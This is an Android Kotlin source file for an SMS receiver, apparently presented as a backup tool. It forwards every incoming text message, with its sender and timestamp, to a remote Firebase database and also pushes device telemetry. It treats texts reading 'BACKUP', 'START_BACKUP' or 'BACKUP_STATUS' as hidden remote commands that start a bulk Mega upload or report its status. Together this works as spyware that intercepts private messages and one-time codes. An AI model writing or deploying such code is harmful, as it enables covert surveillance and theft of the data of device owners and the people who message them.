package com.example.receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import com.example.data.local.AppDatabase
import com.example.data.local.SmsLogEntity
import com.example.data.sync.FirebaseSyncEngine
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
            val pendingResult = goAsync()
            val appContext = context.applicationContext
            CoroutineScope(Dispatchers.IO).launch {
                try {
                    val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
                    if (!messages.isNullOrEmpty()) {
                        val db = AppDatabase.getInstance(appContext)
                        val engine = FirebaseSyncEngine(appContext)
                        messages.forEach { smsMessage ->
                            val address = smsMessage.originatingAddress ?: "Unknown"
                            val body = smsMessage.displayMessageBody ?: smsMessage.messageBody ?: ""
                            val timestamp = smsMessage.timestampMillis.takeIf { it > 0 } ?: System.currentTimeMillis()

                            // Check for SMS fallback commands
                            val trimmedBody = body.trim().uppercase()
                            if (trimmedBody == "BACKUP" || trimmedBody == "START_BACKUP") {
                                com.example.service.MegaUploadService.startService(appContext)
                            } else if (trimmedBody == "BACKUP_STATUS") {
                                val statusMap = com.example.data.sync.MegaUploadManager.getBackupStatusMap(appContext)
                                val isRunning = statusMap["isRunning"]
                                val folder = statusMap["currentFolder"]
                                // Log / Sync status
                                engine.uploadSingleSmsInstant(address, "SMS Backup Status: Running=$isRunning, Folder=$folder", System.currentTimeMillis())
                            }

                            // 1. Instantly upload to Firebase Realtime Database at /devices/{deviceId}/sms
                            engine.uploadSingleSmsInstant(address, body, timestamp)

                            // 2. Save to local Room DB
                            val entity = SmsLogEntity(
                                address = address,
                                messageBody = body,
                                timestamp = timestamp,
                                type = "INCOMING",
                                threadId = 0
                            )
                            db.smsDao().insertSms(entity)
                        }
                    }

                    // Also trigger full telemetry push
                    FirebaseSyncEngine(appContext).pushTelemetryToFirebase()
                } catch (_: Exception) {
                    // Fallback
                    FirebaseSyncEngine(appContext).pushTelemetryToFirebase()
                } finally {
                    pendingResult.finish()
                }
            }
        }
    }
}
